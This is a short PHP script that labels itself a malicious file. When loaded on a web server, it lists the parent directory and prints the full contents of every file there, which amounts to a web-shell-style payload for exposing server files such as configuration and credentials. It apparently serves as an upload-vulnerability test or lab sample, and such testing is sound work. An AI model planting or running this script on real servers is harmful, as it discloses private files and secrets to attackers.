<?php
echo "This is a malicious file.<br>";

// Function to list files in a directory
function listFiles($dir) {
    if ($handle = opendir($dir)) {
        echo "Files in directory $dir:<br>";
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                echo "$entry<br>";
            }
        }
        closedir($handle);
    } else {
        echo "Could not open directory $dir.<br>";
    }
}

// Function to read and display file contents
function readFileContents($filepath) {
    if (file_exists($filepath)) {
        echo "Contents of $filepath:<br>";
        echo nl2br(htmlspecialchars(file_get_contents($filepath))) . "<br><br>";
    } else {
        echo "$filepath file does not exist.<br>";
    }
}

// List and display all files in the includes directory
$includes_dir = '../';
listFiles($includes_dir);

$files = scandir($includes_dir);
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $filepath = $includes_dir . '/' . $file;
        readFileContents($filepath);
    }
}
?>